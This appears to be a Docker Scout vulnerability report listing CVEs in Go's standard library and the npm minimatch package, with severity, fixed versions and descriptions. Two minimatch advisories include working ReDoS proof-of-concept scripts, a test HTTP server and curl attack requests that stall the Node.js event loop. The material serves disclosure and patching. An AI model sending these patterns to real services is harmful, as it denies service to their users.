<tr><td>EPSS Score</td><td><code>0.004%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was possible to improperly access the parent directory of an os.Root by opening a filename ending in "../". For example, Root.Open("../") would open the parent directory of the Root. This escape only permits opening the parent directory itself, not ancestors of the parent or files contained within the parent.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 6" src="https://img.shields.io/badge/H-6-e25d68"/> <img alt="medium: 9" src="https://img.shields.io/badge/M-9-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>stdlib</strong> <code>1.23.12</code> (golang)</summary>

<small><code>pkg:golang/stdlib@1.23.12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68121?s=golang&n=stdlib&t=golang&vr=%3C1.24.13"><img alt="critical : CVE--2025--68121" src="https://img.shields.io/badge/CVE--2025--68121-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During session resumption in crypto/tls, if the underlying Config has its ClientCAs or RootCAs fields mutated between the initial handshake and the resumed handshake, the resumed handshake may succeed when it should have failed. This may happen when a user calls Config.Clone and mutates the returned Config, or uses Config.GetConfigForClient. This can cause a client to resume a session with a server that it would not have resumed with during the initial handshake, or cause a server to resume a session with a client that it would not have resumed with during the initial handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61729?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="high : CVE--2025--61729" src="https://img.shields.io/badge/CVE--2025--61729-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Within HostnameError.Error(), when constructing an error string, there is no limit to the number of hosts that will be printed out. Furthermore, the error string is constructed by repeated string concatenation, leading to quadratic runtime. Therefore, a certificate provided by a malicious actor can result in excessive resource consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61726?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="high : CVE--2025--61726" src="https://img.shields.io/badge/CVE--2025--61726-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/url package does not set a limit on the number of query parameters in a query.

While the maximum size of query parameters in URLs is generally limited by the maximum request header size, the net/http.Request.ParseForm method can parse large URL-encoded forms. Parsing a large form containing many unique query parameters can cause excessive memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61725" src="https://img.shields.io/badge/CVE--2025--61725-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ParseAddress function constructs domain-literal address components through repeated string concatenation. When parsing large domain-literal components, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61723" src="https://img.shields.io/badge/CVE--2025--61723-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The processing time for parsing some invalid inputs scales non-linearly with respect to the size of the input.

This affects programs which parse untrusted PEM inputs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--58188" src="https://img.shields.io/badge/CVE--2025--58188-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Validating certificate chains which contain DSA public keys can cause programs to panic, due to a interface cast that assumes they implement the Equal method.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"><img alt="high : CVE--2025--58187" src="https://img.shields.io/badge/CVE--2025--58187-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Due to the design of the name constraint checking algorithm, the processing time of some inputs scale non-linearly with respect to the size of the certificate.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61728?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61728" src="https://img.shields.io/badge/CVE--2025--61728-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

archive/zip uses a super-linear file name indexing algorithm that is invoked the first time a file in an archive is opened. This can lead to a denial of service when consuming a maliciously constructed ZIP archive.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61727?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="medium : CVE--2025--61727" src="https://img.shields.io/badge/CVE--2025--61727-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An excluded subdomain constraint in a certificate chain does not restrict the usage of wildcard SANs in the leaf certificate. For example a constraint that excludes the subdomain test.example.com does not prevent a leaf certificate from claiming the SAN *.example.com.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61730?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61730" src="https://img.shields.io/badge/CVE--2025--61730-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During the TLS 1.3 handshake if multiple messages are sent in records that span encryption level boundaries (for instance the Client Hello and Encrypted Extensions messages), the subsequent messages may be processed before the encryption level changes. This can cause some minor information disclosure if a network-local attacker can inject messages during the handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--61724" src="https://img.shields.io/badge/CVE--2025--61724-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Reader.ReadResponse function constructs a response string through repeated string concatenation of lines. When the number of lines in a response is large, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58189" src="https://img.shields.io/badge/CVE--2025--58189-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When Conn.Handshake fails during ALPN negotiation the error contains attacker controlled information (the ALPN protocols sent by the client) which is not escaped.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58186" src="https://img.shields.io/badge/CVE--2025--58186-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Despite HTTP headers having a default limit of 1MB, the number of cookies that can be parsed does not have a limit. By sending a lot of very small cookies such as "a=;", an attacker can make an HTTP server allocate a large amount of structs, causing large memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58185" src="https://img.shields.io/badge/CVE--2025--58185-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Parsing a maliciously crafted DER payload could allocate large amounts of memory, causing memory exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--47912" src="https://img.shields.io/badge/CVE--2025--47912-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Parse function permits values other than IPv6 addresses to be included in square brackets within the host component of a URL. RFC 3986 permits IPv6 addresses to be included within the host component, enclosed within square brackets. For example: "http://[::1]/". IPv4 addresses and hostnames must not appear within square brackets. Parse did not enforce this requirement.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58183" src="https://img.shields.io/badge/CVE--2025--58183-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

tar.Reader does not set a maximum size on the number of sparse region data blocks in GNU tar pax 1.0 sparse files. A maliciously-crafted archive containing a large number of sparse regions can cause a Reader to read an unbounded amount of data from the archive into memory. When reading from a compressed source, a small compressed input can result in large allocations.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>minimatch</strong> <code>10.1.2</code> (npm)</summary>

<small><code>pkg:npm/minimatch@10.1.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-26996?s=github&n=minimatch&t=npm&vr=%3E%3D10.0.0%2C%3C10.2.1"><img alt="high 8.7: CVE--2026--26996" src="https://img.shields.io/badge/CVE--2026--26996-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=10.0.0<br/><10.2.1</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.052%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.


### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### PoC
When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.
### Impact
Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:
- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

----

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27904?s=github&n=minimatch&t=npm&vr=%3E%3D10.0.0%2C%3C10.2.3"><img alt="high 7.5: CVE--2026--27904" src="https://img.shields.io/badge/CVE--2026--27904-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=10.0.0<br/><10.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern              | Generated regex                          |
|----------------------|------------------------------------------|
| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern              | Input              | Time       |
|----------------------|--------------------|------------|
| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern              | Time         |
|-------|----------------------|--------------|
| 1     | `*(a\|b)`            | 0ms          |
| 2     | `*(*(a\|b))`         | 4ms          |
| 3     | `*(*(*(a\|b)))`      | 270ms        |
| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch'

function timed(fn) {
  const s = process.hrtime.bigint()
  let result, error
  try { result = fn() } catch(e) { error = e }
  const ms = Number(process.hrtime.bigint() - s) / 1e6
  return { ms, result, error }
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b'
  for (let i = 0; i < depth; i++) pat = `*(${pat})`
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
  console.log(`depth=${depth} "${pat}" -> ${re}`)
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15],   // ~270ms
  ['*(*(*(a|b)))', 17],   // ~800ms
  ['*(*(*(a|b)))', 19],   // ~2400ms
  ['*(*(a|b))',    23],   // ~260ms
  ['*(a|b)',      101],   // <5ms (depth=1 control)
]
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
}

// Confirm noext disables the vulnerability
const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))
console.log(`"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
```

Observed output:
```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3001
http.createServer((req, res) => {
  const url     = new URL(req.url, `http://localhost:${PORT}`)
  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0,30)}"`)
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
}).listen(PORT, () => console.log(`listening on ${PORT}`))
```

Terminal 1 -- start the server:
```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:
```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**
```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**
```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**
```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27903?s=github&n=minimatch&t=npm&vr=%3E%3D10.0.0%2C%3C10.2.3"><img alt="high 7.5: CVE--2026--27903" src="https://img.shields.io/badge/CVE--2026--27903-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Algorithmic Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=10.0.0<br/><10.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.045%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

